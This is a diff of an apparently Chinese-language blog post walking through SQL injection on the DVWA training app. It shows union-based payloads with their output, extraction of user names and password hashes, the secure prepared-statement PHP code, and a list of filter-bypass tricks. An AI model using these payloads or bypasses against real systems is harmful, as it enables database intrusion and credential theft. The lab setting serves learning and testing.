@@ -115,9 +115,61 @@
       
 
       
-      <p><strong>SQL Injection</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39;#</span><br><span class="line">&#x2F;&#x2F;输出如下</span><br><span class="line">ID: 1&#39; union select 1,table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39;#</span><br><span class="line">First name: 1</span><br><span class="line">Surname: guestbook</span><br><span class="line">ID: 1&#39; union select 1,table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39;#</span><br><span class="line">First name: 1</span><br><span class="line">Surname: users</span><br></pre></td></tr></table></figure>
+      <h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a><strong>SQL Injection</strong></h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a><strong>low</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39;#</span><br><span class="line">&#x2F;&#x2F;输出如下</span><br><span class="line">ID: 1&#39; union select 1,table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39;#</span><br><span class="line">First name: 1</span><br><span class="line">Surname: guestbook</span><br><span class="line">ID: 1&#39; union select 1,table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39;#</span><br><span class="line">First name: 1</span><br><span class="line">Surname: users</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;爆users的列</span><br><span class="line">1&#39; union select 1,column_name from information_schema.columns where table_name&#x3D;&#39;users&#39;#</span><br><span class="line">ID: 1&#39; union select 1,column_name from information_schema.columns where table_name&#x3D;&#39;users&#39;#</span><br><span class="line">First name: 1</span><br><span class="line">Surname: user</span><br><span class="line">ID: 1&#39; union select 1,column_name from information_schema.columns where table_name&#x3D;&#39;users&#39;#</span><br><span class="line">First name: 1</span><br><span class="line">Surname: password</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;爆user列和password列的字段内容</span><br><span class="line">1&#39; union select 1,concat(user,password) from users#</span><br></pre></td></tr></table></figure>
 
+<h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a><strong>medium</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//直接爆数据库名和表名                                         末尾加  &amp;&amp;Submit=Submit</span></span><br><span class="line">id=<span class="number">1</span> union select database(),table_name from information_schema.tables where table_schema=database()<span class="comment">#</span></span><br><span class="line"><span class="comment">//查询用户名和对应的密码</span></span><br><span class="line">id=<span class="number">1</span> union select concat(user),concat(password)  from users <span class="comment">##&amp;&amp;Submit=Submit</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="high"><a href="#high" class="headerlink" title="high"></a><strong>high</strong></h3><p>不是很懂这里后面加了limit1 有什么用，注释掉就好了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: id=<span class="number">1</span><span class="string">'  union select concat(user),concat(password)  from users #</span></span><br><span class="line"><span class="string">First name: admin</span></span><br><span class="line"><span class="string">Surname: 5f4dcc3b5aa765d61d8327deb882cf99</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a><strong>impossible</strong></h3><p>这个就很有意思了，新手很值得学习，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">':id'</span>, $id, PDO::PARAM_INT );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">        $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            $first = $row[ <span class="string">'first_name'</span> ];</span><br><span class="line">            $last  = $row[ <span class="string">'last_name'</span> ];</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p>引用<a href="https://blog.csdn.net/qq_45555226/article/details/102884030" target="_blank" rel="noopener">大佬</a>的一张图可以很直观的看到从low到impossible级别所加的防御机制</p>
+<img src="/2020/04/02/DVWA/1.png" style="zoom: 67%;">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<p>一、如果发现一个url可能是注入点之后我们可以尝试手注，但是一般的网站都会过滤一些字符串。</p>
+<p>在^没有被过滤的时候可以利用它来测试</p>
+<p>异或：xor或^</p>
+<p>逻辑运算就是：同真异假（两个条件结果相同就为真，结果不同就为假）</p>
+<p>例如：1^0 就是 1 ，1^1 就是 0</p>
+<p>例如：?id=1’ ^ (length(‘union’)!=0)–+</p>
+<p>如果union被过滤，则后面条件的结果就是假的，前面也是假的，url返回正确</p>
+<p>如果union没有被过滤，则后面的条件的结果就是真的，而前面是假的，url返回错误</p>
+<p>也可以是?id=1’ ^ (length(‘union’)=5)–+</p>
+<p>二、简单的sql绕过</p>
+<p>基本关键字：括号、空格、引号、#、=、+、and、or、order、select、union、update、inster、into、delete、outfile……</p>
+<p>一些绕过的方法：</p>
+<p>1、 大小写混写</p>
+<p>2、 使用url编码替换字符 ‘ %27，# %23</p>
+<p>3、 十六进制绕过 where=“user” where=0x7573657273</p>
+<p>4、使用&amp;&amp; || 代替and or</p>
+<p>5、双写关键字 aandnd</p>
+<p>6、绕过空格：用tab键代替空格</p>
+<p>用回车chr(13)&amp;chr(10)，url编码的形式%0d%0a</p>
+<p>用括号 id=1(and)1=1</p>
+<p>7、=用like、rlike、等代替</p>
+<p>8、使用/<strong>/注释符来，重组关键字 un/</strong>/i/**/on</p>
+<p>9、注释负：//，– , /**/, #, –+, – -, ;,%00,–a</p>
+<p>如果是使用gbk的网页编码的网站也可以利用宽字节来绕过 </p>
 
       
       <!-- reward -->
